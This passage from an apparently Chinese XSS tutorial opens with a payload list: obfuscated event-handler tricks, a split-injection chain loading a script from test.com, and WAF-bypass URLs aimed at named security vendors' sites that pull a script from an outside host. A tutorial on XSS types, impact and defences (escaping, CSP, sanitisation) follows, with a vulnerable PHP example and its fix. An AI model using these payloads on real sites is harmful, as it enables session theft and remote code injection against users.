<span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].map(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].find(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].every(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].filter(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].forEach(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="赋值拼接"><a href="#赋值拼接" class="headerlink" title="赋值拼接"></a>赋值拼接</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img src <span class="hljs-attribute">onerror</span>=_=alert,_(1)&gt;<br>&lt;img src <span class="hljs-attribute">x</span>=al <span class="hljs-attribute">y</span>=ert <span class="hljs-attribute">onerror</span>=top[x+y](1)&gt;<br>&lt;img src <span class="hljs-attribute">onerror</span>=top[<span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;al&#x27;</span>,b=&#x27;ev&#x27;,b+a](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)&gt;<br>&lt;img src onerror=[<span class="hljs-string">&#x27;ale&#x27;</span>+<span class="hljs-string">&#x27;rt&#x27;</span>].map(top[<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>])[0][<span class="hljs-string">&#x27;valu&#x27;</span>+<span class="hljs-string">&#x27;eOf&#x27;</span>]()(1)&gt;<br></code></pre></td></tr></table></figure><h2 id="火狐IE专属"><a href="#火狐IE专属" class="headerlink" title="火狐IE专属"></a>火狐IE专属</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h2><p>当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的xss攻击向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=<span class="hljs-string">&#x27;document.write(&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">a=a+&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">ht</span>&#x27;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;tp://test.com/xs&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>a=a+&#x27;s.js&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;)&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(a)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过上面的拆分法可以拼凑出下面完整的攻击向量：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">document.write(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span> = <span class="hljs-string">http://test.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;)<br></code></pre></td></tr></table></figure><h1 id="三、绕过-waf-拦截"><a href="#三、绕过-waf-拦截" class="headerlink" title="三、绕过 waf 拦截"></a>三、绕过 waf 拦截</h1><h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=top</span>[<span class="hljs-string">`al`%2B`ert`</span>](1);&gt;<br>http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=appendChild(createElement(&quot;script&quot;)).src=&quot;//z.cn&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top</span>[<span class="hljs-string">`al`%2B`ert`</span>](1);&gt;<br><span class="hljs-link">http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top</span>[<span class="hljs-string">a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba</span>](appendChild(createElement(<span class="hljs-code">`script`</span>)).src=<span class="hljs-code">`//z.cn`</span>);&gt;<br></code></pre></td></tr></table></figure><h3 id="云锁-奇安信-waf"><a href="#云锁-奇安信-waf" class="headerlink" title="云锁+奇安信 waf"></a>云锁+奇安信 waf</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top</span>[<span class="hljs-string">`al`%2B`ert`</span>](1);&gt;<br><span class="hljs-link">http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top</span>[<span class="hljs-string">a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba</span>](appendChild(createElement(<span class="hljs-code">`script`</span>)).src=<span class="hljs-code">`//z.cn`</span>);&gt;<br></code></pre></td></tr></table></figure><h1 id="XSS知识点总结"><a href="#XSS知识点总结" class="headerlink" title="XSS知识点总结"></a>XSS知识点总结</h1><h2 id="一、什么是-XSS（跨站脚本攻击）？"><a href="#一、什么是-XSS（跨站脚本攻击）？" class="headerlink" title="一、什么是 XSS（跨站脚本攻击）？"></a>一、什么是 XSS（跨站脚本攻击）？</h2><ul><li><strong>核心定义：</strong> XSS 是一种安全漏洞，攻击者能够将<strong>恶意脚本</strong>注入到其他用户会访问和信任的<strong>合法网页</strong>中。</li><li><strong>关键点：</strong><ul><li><strong>“跨站”：</strong> 恶意脚本通常来源于攻击者控制的站点或资源（虽然最终是在受害者访问的目标站点上执行）。</li><li><strong>“脚本”：</strong> 主要是 JavaScript，但也可以是其他浏览器支持的脚本语言（如 VBScript，但已较少见）。JavaScript 因其强大功能和普遍支持成为首选。</li><li><strong>“攻击”：</strong> 目的是窃取用户数据、劫持会话、篡改页面内容、进行钓鱼诈骗、传播恶意软件或发动更高级的攻击。</li></ul></li><li><strong>本质：</strong> XSS 利用了 Web 应用对<strong>用户输入数据的不充分验证和转义</strong>。当 Web 应用将用户提供的数据直接嵌入到其输出的 HTML 页面中，而没有进行适当的清理时，攻击者就能插入可被浏览器执行的恶意代码。</li><li><strong>受害者视角：</strong> 用户访问了一个看似正常、可信的网站（如银行、社交媒体、论坛），却不知该网站已被注入了恶意脚本。用户的浏览器在渲染页面时，会忠实地执行这些脚本，导致攻击发生。用户通常对此毫无察觉。</li></ul><h2 id="二、XSS-攻击是如何发生的？-原理剖析"><a href="#二、XSS-攻击是如何发生的？-原理剖析" class="headerlink" title="二、XSS 攻击是如何发生的？(原理剖析)"></a>二、XSS 攻击是如何发生的？(原理剖析)</h2><p>想象一下 Web 应用处理用户输入并显示结果的典型流程：</p><ol><li><p><strong>用户输入：</strong> 用户在 Web 表单、搜索框、URL 参数、评论框等地方输入数据（如 <code>张三</code>）。</p></li><li><p><strong>服务器处理：</strong> Web 服务器接收输入数据，并可能将其存储在数据库（如评论）或直接用于生成新页面（如搜索结果）。</p></li><li><p><strong>页面生成：</strong> 服务器将处理结果（包含用户输入的数据）嵌入到动态生成的 HTML 页面中。例如：</p><blockquote><ul><li>评论页面： <code>&lt;div&gt;用户说：张三&lt;/div&gt;</code></li><li>搜索结果页面： <code>&lt;p&gt;您搜索的关键词是：张三&lt;/p&gt;</code></li></ul></blockquote></li><li><p><strong>浏览器渲染：</strong> 用户的浏览器接收到 HTML 页面，解析并渲染它。浏览器遇到 <code>&lt;script&gt;</code> 标签或具有 JavaScript 代码的事件属性（如 <code>onerror</code>, <code>onload</code>, <code>onclick</code>）时，会<strong>执行其中的代码</strong>。</p></li></ol><h3 id="漏洞点在哪里？"><a href="#漏洞点在哪里？" class="headerlink" title="漏洞点在哪里？"></a>漏洞点在哪里？</h3><p>问题出在第 3 步：<strong>将未经验证&#x2F;转义的用户输入直接嵌入到 HTML 输出中</strong>。</p><ul><li><strong>正常情况：</strong> 用户输入的是无害文本（如 <code>张三</code>）。</li><li><strong>攻击情况：</strong> 攻击者输入的是<strong>精心构造的字符串</strong>，这些字符串包含 HTML 和 JavaScript 代码。如果服务器端没有对这些输入进行过滤或转义，这些代码就会原封不动地成为最终 HTML 页面的一部分。</li></ul><h3 id="攻击者输入示例"><a href="#攻击者输入示例" class="headerlink" title="攻击者输入示例"></a>攻击者输入示例</h3><p>假设有一个搜索功能，搜索词会显示在结果页面上：</p><ul><li><blockquote><p>攻击者不输入 <code>猫</code>，而是输入：<br><code>&lt;script&gt;alert(&#39;XSS!&#39;);&lt;/script&gt;</code></p></blockquote></li><li><blockquote><p>如果服务器未处理，生成的页面可能包含：<br><code>&lt;p&gt;您搜索的关键词是：&lt;script&gt;alert(&#39;XSS!&#39;);&lt;/script&gt;&lt;/p&gt;</code></p></blockquote></li><li><blockquote><p>当其他用户访问这个搜索结果页面时，浏览器会解析到 <code>&lt;script&gt;</code> 标签，并执行 <code>alert(&#39;XSS!&#39;);</code>，弹出一个警告框。这就是一个最简单的 XSS 攻击证明（PoC）。</p></blockquote></li></ul><h2 id="三、XSS-攻击的主要类型"><a href="#三、XSS-攻击的主要类型" class="headerlink" title="三、XSS 攻击的主要类型"></a>三、XSS 攻击的主要类型</h2><p>根据恶意脚本的<strong>来源</strong>和<strong>持久性</strong>，XSS 通常分为三类：</p><ol><li><p><strong>反射型 XSS (Reflected XSS &#x2F; Non-Persistent XSS)</strong></p><ul><li><p><strong>原理：</strong> 恶意脚本作为<strong>请求的一部分</strong>（通常是 URL 参数）发送给服务器，服务器在响应中<strong>原样返回</strong>这个脚本，浏览器执行它。脚本<strong>不会</strong>被存储在服务器上（如数据库中）。</p></li><li><p><strong>攻击方式：</strong></p><ul><li><blockquote><p>攻击者构造一个包含恶意脚本的特殊 URL（例如：<code>https://victim-site.com/search?query=&lt;script&gt;恶意代码&lt;/script&gt;</code>）。</p></blockquote></li><li><p>通过<strong>钓鱼邮件、社交媒体、即时消息</strong>等方式诱骗受害者点击这个链接。</p></li><li><p>受害者点击链接 → 浏览器向 <code>victim-site.com</code> 发送请求（包含恶意脚本）→ 服务器生成包含恶意脚本的页面 → 受害者的浏览器接收并执行该脚本。</p></li></ul></li><li><p><strong>特点：</strong></p><ul><li><strong>非持久化：</strong> 恶意脚本只存在于这次请求的响应中，不会存储在服务器端。</li><li><strong>需要用户交互：</strong> 通常需要诱骗用户点击恶意链接。</li><li><strong>针对个体：</strong> 一次攻击影响点击该链接的特定用户。</li><li><strong>常见位置：</strong> 搜索框、错误消息页面、表单提交确认页等将输入直接反射回页面的地方。</li></ul></li></ul></li><li><p><strong>存储型 XSS (Stored XSS &#x2F; Persistent XSS)</strong></p><ul><li><p><strong>原理：</strong> 恶意脚本被提交到服务器（例如通过评论、论坛帖子、用户资料、留言板），并<strong>永久存储</strong>在服务器端（如数据库中）。当其他用户后来访问<strong>包含该存储内容</strong>的页面时，恶意脚本就会从服务器加载并执行。</p></li><li><p><strong>攻击方式：</strong></p><ul><li><blockquote><p>攻击者在目标网站的允许用户输入且内容会被展示给其他用户的地方（如评论区）提交包含恶意脚本的内容（如 <code>&lt;script&gt;恶意代码&lt;/script&gt;</code>）。</p></blockquote></li><li><p>服务器未经验证&#x2F;转义将其存入数据库。</p></li><li><p>当任何合法用户访问显示该内容的页面（如查看那条评论的页面）时，恶意脚本会从服务器加载，嵌入在页面中，并在用户的浏览器中执行。</p></li></ul></li><li><p><strong>特点：</strong></p><ul><li><strong>持久化：</strong> 恶意脚本长期存储在服务器上，危害持续存在。</li><li><strong>无需直接交互：</strong> 受害者只需访问受感染的页面即可中招，无需点击特定链接。</li><li><strong>影响范围广：</strong> 所有访问该受感染页面的用户都可能成为受害者。</li><li><strong>危害最大：</strong> 最常见也最危险，因为它能自动感染大量用户。</li><li><strong>常见位置：</strong> 用户评论、论坛帖子、聊天消息、用户昵称、商品描述（如果可以用户编辑）等。</li></ul></li></ul></li><li><p><strong>基于 DOM 的 XSS (DOM-based XSS)</strong></p><ul><li><blockquote><p><strong>原理：</strong> 整个攻击过程<strong>完全在客户端浏览器中发生</strong>，不涉及服务器响应内容的直接注入。恶意脚本是通过修改页面的 <strong>DOM（文档对象模型）</strong> 环境来触发的。漏洞存在于<strong>客户端 JavaScript 代码</strong>中，该代码不安全地处理用户可控的数据（如 URL 片段 <code>#</code> 后面的部分 <code>location.hash</code>、 <code>document.referrer</code> 或其他 DOM 属性），并用于动态更新 DOM（例如使用 <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code> 等危险方法）。</p></blockquote></li><li><p><strong>攻击方式：</strong></p><ul><li><p>攻击者构造一个包含恶意数据的特殊 URL（通常是 <code>#</code> 后面的片段，如 <code>https://victim-site.com/page#恶意数据</code>）。</p></li><li><p>诱骗受害者点击该链接。</p></li><li><p>受害者浏览器加载正常页面和 JavaScript。</p></li><li><p>页面中的<strong>有漏洞的客户端 JavaScript</strong> 读取了 URL 中的恶意数据（如 <code>location.hash</code>）。</p></li><li><blockquote><p>该 JavaScript 代码<strong>不安全地将恶意数据插入到 DOM 中</strong>（例如 <code>element.innerHTML = location.hash.substring(1);</code>）。</p></blockquote></li><li><p>浏览器解析新插入的包含恶意脚本的 HTML，导致脚本执行。</p></li></ul></li><li><p><strong>特点：</strong></p><ul><li><p><strong>纯客户端：</strong> 恶意代码的执行不依赖于服务器返回的响应内容（虽然触发它的数据可能来自 URL，但服务器可能根本不处理 <code>#</code> 后的片段）。</p></li><li><p><strong>难以检测：</strong> 服务器日志可能看不到恶意负载（因为片段 <code>#</code> 后的内容通常不发送到服务器），传统的服务器端 WAF 或扫描器可能无法发现。</p></li><li><p><strong>依赖前端代码：</strong> 漏洞根源在于前端 JavaScript 逻辑不安全地操作了用户可控的 DOM 数据源。</p></li><li><blockquote><p><strong>常见来源：</strong> <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>document.cookie</code>, <code>window.name</code>, <code>postMessage</code> 数据等。</p></blockquote></li><li><blockquote><p><strong>常见接收器（Sink）：</strong> <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>document.writeln()</code>, <code>eval()</code>, <code>setTimeout()</code>, <code>setInterval()</code>, <code>Function()</code> 构造函数等能将字符串解析为 HTML 或执行代码的方法&#x2F;属性。</p></blockquote></li></ul></li></ul></li></ol><h2 id="四、XSS-攻击能造成什么危害？-攻击载荷-Payload"><a href="#四、XSS-攻击能造成什么危害？-攻击载荷-Payload" class="headerlink" title="四、XSS 攻击能造成什么危害？(攻击载荷 - Payload)"></a>四、XSS 攻击能造成什么危害？(攻击载荷 - Payload)</h2><p>一旦恶意脚本在受害者浏览器中执行，攻击者几乎可以执行该用户在该网站上下文中的任何操作：</p><ol><li><strong>窃取 Cookie：</strong> 最常见的攻击载荷。脚本可以访问当前站点的 Cookie（如果 Cookie 没有设置 <code>HttpOnly</code> 标志）：<code>document.cookie</code>。窃取到的会话 Cookie 可以让攻击者直接<strong>劫持用户会话</strong>，无需密码即可登录用户账户。</li><li><strong>冒充用户操作：</strong> 脚本可以代表用户发起请求（CSRF Token 也可能被窃取或绕过），执行如转账、更改密码、发送消息、购买商品等操作。</li><li><strong>钓鱼攻击：</strong> 脚本可以动态修改页面内容，插入一个伪造的登录表单，诱骗用户输入用户名、密码、信用卡信息等，并发送给攻击者。</li><li><strong>键盘记录：</strong> 脚本可以监听用户在页面上的键盘输入，窃取敏感信息（如密码、信用卡号）。</li><li><strong>窃取敏感信息：</strong> 脚本可以读取 DOM 中的内容，可能包含用户的个人信息、私密消息、财务数据等。</li><li><strong>传播恶意软件：</strong> 脚本可以重定向用户到恶意网站下载病毒、木马、勒索软件，或者利用浏览器漏洞进行攻击。</li><li><strong>网站篡改（Defacement）：</strong> 修改页面内容，显示攻击者的信息或恶作剧内容。</li><li><strong>发起 DDoS 攻击：</strong> 感染大量用户浏览器（僵尸网络）向特定目标发起分布式拒绝服务攻击。</li><li><strong>利用受害者身份进行攻击：</strong> 以受害者为跳板，攻击其所在组织的内部网络（如果受害者是在公司内网访问）。</li><li><strong>记录屏幕&#x2F;摄像头&#x2F;麦克风（需额外权限或漏洞）：</strong> 在特定条件下（如用户授权过或存在漏洞），脚本可能尝试访问用户的摄像头、麦克风或屏幕。</li></ol><h2 id="五、如何防御-XSS-攻击？"><a href="#五、如何防御-XSS-攻击？" class="headerlink" title="五、如何防御 XSS 攻击？"></a>五、如何防御 XSS 攻击？</h2><p>防御 XSS 需要综合应用多种策略，核心原则是：<strong>不要信任任何用户输入！</strong></p><ol><li><p><strong>输入验证 (Input Validation):</strong></p><ul><li><strong>目的：</strong> 在服务器端（和必要时在客户端）对用户输入进行<strong>严格的格式和内容检查</strong>。</li><li><strong>怎么做：</strong><ul><li>使用<strong>白名单</strong>策略：只允许已知安全的字符集和结构（例如，姓名字段只允许字母、空格和连字符；邮箱字段必须符合邮箱格式）。</li><li>使用<strong>黑名单</strong>策略要极其谨慎（容易被绕过），仅作为白名单的补充。</li><li>验证数据的类型、长度、格式和范围。</li><li>使用强大的正则表达式进行匹配。</li></ul></li><li><strong>注意：</strong> 输入验证是重要的第一道防线，但<strong>不能单独</strong>防御 XSS，因为很多合法输入也可能包含有特殊含义的字符（如评论中讨论 HTML 代码本身）。必须结合输出编码。</li></ul></li><li><p><strong>输出编码 (Output Encoding &#x2F; Context-Aware Escaping):</strong></p><ul><li><p><strong>核心防御手段！</strong> 这是最有效、最根本的防御措施。</p></li><li><p><strong>目的：</strong> 在将<strong>不可信的数据</strong>（来自用户、数据库、第三方 API 等）<strong>动态嵌入</strong>到 HTML 文档的不同位置（上下文）时，对其进行转义，将其中具有特殊含义的字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code>, <code>&#39;</code>, <code>/</code>）转换为安全的 HTML 实体（如 <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;#x27;</code>, <code>&amp;#x2F;</code>），使浏览器将其视为纯文本数据，而不是可执行的代码或 HTML 标签的一部分。</p></li><li><p><strong>关键：上下文感知！</strong> 转义规则<strong>必须</strong>根据数据将要被插入的位置来决定：</p><blockquote><ul><li><strong>HTML Body 上下文 (在标签之间)：</strong> 转义 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code>, <code>&#39;</code>。例如：<code>&lt;div&gt;用户输入：</code> + <code>escapeHtml(userInput)</code> + <code>&lt;/div&gt;</code></li><li><strong>HTML 属性值上下文：</strong> 转义 <code>&quot;</code>, <code>&#39;</code>, <code> </code> (空格可能导致属性提前结束)，有时还要转义 <code>/</code>。始终用引号（单或双）包裹属性值。例如：<code>&lt;input type=&quot;text&quot; value=&quot;</code> + <code>escapeHtmlAttr(userInput)</code> + <code>&quot;&gt;</code></li><li><strong>JavaScript 上下文 (在 <code>&lt;script&gt;</code> 标签内或在事件处理程序中)：</strong> 这是最危险的。必须将不可信数据放入引号（单&#x2F;双）中，并对其中的引号、换行符等进行转义（使用 <code>\</code>）。**强烈建议避免**在 JavaScript 中直接拼接 HTML 或使用 <code>eval()</code>&#x2F;<code>innerHTML</code>。使用 <code>JSON.stringify()</code> 并确保输出在正确的 <code>&lt;script&gt;</code> 块中。或者更安全地，通过安全的 API 操作 DOM（如 <code>textContent</code>）。</li><li><strong>CSS 上下文：</strong> 转义特殊字符，严格验证数据。避免使用不可信数据构造完整的 CSS 属性值或 URL。</li><li><strong>URL 上下文 (在 href&#x2F;src 属性中)：</strong> 验证 URL 协议（白名单 <code>http:</code>, <code>https:</code>，拒绝 <code>javascript:</code>）。使用安全的 URL 编码函数。</li></ul></blockquote></li><li><p><strong>实施：</strong></p><ul><li>使用成熟的、经过安全审计的<strong>编码库</strong>（如 OWASP ESAPI、DOMPurify (用于 HTML&#x2F;SVG)、框架内置的编码函数（如 PHP 的 <code>htmlspecialchars</code>, Python Django 的模板自动转义, React&#x2F;Vue&#x2F;Angular 的默认数据绑定机制）。</li><li><strong>绝对避免</strong>手动拼接字符串构造 HTML 或 JavaScript！</li><li>框架使用者：理解并信任框架的默认安全机制（如 React 的 JSX 转义），但要知道其边界（使用 <code>dangerouslySetInnerHTML</code> 时需极其小心并手动净化）。</li></ul></li></ul></li><li><blockquote><p><strong>使用安全的 API 操作 DOM (针对 DOM XSS):</strong></p><ul><li><strong>避免：</strong> <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>document.writeln()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>setInterval(string)</code>, <code>new Function(string)</code>。</li><li><strong>推荐：</strong><ul><li>使用 <code>textContent</code> 或 <code>innerText</code> 设置纯文本内容。</li><li>使用 <code>setAttribute()</code> 设置属性值（确保值已编码）。</li><li>使用 <code>addEventListener()</code> 绑定事件处理器，而不是使用 <code>on事件</code> 属性（如 <code>onclick=&quot;...&quot;</code>）。</li><li>创建 DOM 节点时，使用 <code>document.createElement()</code>, <code>appendChild()</code>, <code>createTextNode()</code> 等安全的 API。</li><li>如果必须插入 HTML，<strong>先净化 (Sanitize)</strong>：使用专门的库（如 <strong>DOMPurify</strong>）来移除或转义所有危险的标签和属性，只保留安全的子集（白名单）。</li></ul></li></ul></blockquote></li><li><p><strong>设置安全的 Cookie 属性：</strong></p><ul><li><strong><code>HttpOnly</code>:</strong> 设置为 <code>true</code>。阻止 JavaScript 通过 <code>document.cookie</code> 访问 Cookie，使得即使发生 XSS 也难以直接窃取会话 Cookie。</li><li><strong><code>Secure</code>:</strong> 设置为 <code>true</code>。确保 Cookie 只通过 HTTPS 加密连接传输。</li><li><strong><code>SameSite</code>:</strong> 设置为 <code>Strict</code> 或 <code>Lax</code>。有助于防御 CSRF 攻击，并在一定程度上增加 XSS 利用难度（限制 Cookie 随跨站请求发送）。<code>Strict</code> 最安全但可能影响用户体验（如从邮件链接点进来会丢失登录态），<code>Lax</code> 是较常用的平衡选择。</li></ul></li><li><p><strong>内容安全策略 (Content Security Policy - CSP):</strong></p><ul><li><strong>强大的深度防御机制。</strong></li><li><strong>原理：</strong> 通过 HTTP 响应头 (<code>Content-Security-Policy</code>) 告诉浏览器<strong>哪些来源的资源（脚本、样式、图片、字体、AJAX 请求、框架等）是可信的，可以被加载和执行</strong>。</li><li><strong>如何防御 XSS：</strong><ul><li><strong>禁止内联脚本：</strong> <code>&#39;unsafe-inline&#39;</code> 是一个危险的关键字，应避免使用。禁止内联 <code>&lt;script&gt;</code> 块和 <code>on事件</code> 属性。强制所有脚本必须通过 <code>src</code> 属性从受信任的域加载。这能有效阻止大多数反射型和存储型 XSS 攻击者注入的脚本执行。</li><li><strong>禁止 <code>eval()</code> 及类似函数：</strong> <code>&#39;unsafe-eval&#39;</code> 也应避免。</li><li><strong>限制脚本来源：</strong> 使用 <code>script-src</code> 指令精确指定允许加载 JavaScript 的域名或哈希值&#x2F;随机数。例如：<code>script-src &#39;self&#39; https://trusted-cdn.com;</code></li><li><strong>启用报告：</strong> 使用 <code>report-uri</code> 或 <code>report-to</code> 指令收集策略违规报告，帮助发现潜在攻击或配置问题。</li></ul></li><li><strong>实施：</strong> 需要仔细配置策略，否则可能破坏网站功能。建议从较宽松的策略开始（如 <code>default-src &#39;self&#39;</code>），逐步收紧，并利用浏览器控制台和报告机制调试。</li></ul></li><li><p><strong>其他防御措施：</strong></p><ul><li><strong>输入净化 (Input Sanitization)：</strong> 在特定场景（如富文本编辑器 WYSIWYG），需要允许一些安全的 HTML 标签（如 <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;a&gt;</code>）。此时必须使用强大的 HTML 净化库（如 <strong>DOMPurify</strong>, <strong>jsoup (Java)</strong>, <strong>HTMLPurifier (PHP)</strong>），基于严格的白名单移除或转义所有危险的标签和属性（如 <code>&lt;script&gt;</code>, <code>on事件</code>, <code>javascript:</code>）。</li><li><strong>框架的自动防护：</strong> 现代 Web 框架（如 React, Vue, Angular, Ruby on Rails, Django）通常内置了基本的 XSS 防护（如自动转义模板变量）。<strong>但开发者不能完全依赖于此！</strong> 需要理解其工作原理和局限性（例如，使用 <code>dangerouslySetInnerHTML</code> 或 <code>v-html</code> 时需要手动净化）。</li><li><strong>Web 应用防火墙 (WAF)：</strong> 可以作为缓解措施，通过规则匹配拦截常见的 XSS 攻击载荷。但它<strong>不是根本解决方案</strong>，存在被绕过（如编码变形）的可能，且可能产生误报&#x2F;漏报。应将其视为纵深防御的一层。</li><li><strong>定期安全测试：</strong> 进行渗透测试、代码审计、使用自动化漏洞扫描工具（如 OWASP ZAP, Burp Suite）来主动发现 XSS 漏洞。</li><li><strong>安全编码培训：</strong> 提高开发人员的安全意识和技能。</li></ul></li></ol><h2 id="六、实践案例-简单演示"><a href="#六、实践案例-简单演示" class="headerlink" title="六、实践案例 (简单演示)"></a>六、实践案例 (简单演示)</h2><h3 id="案例-1：反射型-XSS-通过-URL-参数"><a href="#案例-1：反射型-XSS-通过-URL-参数" class="headerlink" title="案例 1：反射型 XSS (通过 URL 参数)"></a>案例 1：反射型 XSS (通过 URL 参数)</h3><ul><li><p><strong>漏洞页面 (search.php):</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$searchTerm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]; <span class="hljs-comment">// 直接获取 URL 参数，未转义！</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;搜索结果： <span class="hljs-subst">$searchTerm</span>&lt;/h1&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><blockquote><p><strong>攻击者构造的 URL:</strong><br><code>http://victim-site.com/search.php?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p></blockquote></li><li><p><strong>防御 (修复后 search.php):</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$searchTerm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-variable">$safeSearchTerm</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$searchTerm</span>, ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>); <span class="hljs-comment">// 关键：输出编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;搜索结果： <span class="hljs-subst">$safeSearchTerm</span>&lt;/h1&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="案例-2：存储型-XSS-通过评论"><a href="#案例-2：存储型-XSS-通过评论" class="headerlink" title="案例 2：存储型 XSS (通过评论)"></a>案例 2：存储型 XSS (通过评论)</h3><ul><li><p><strong>漏洞页面 (comment.php 和 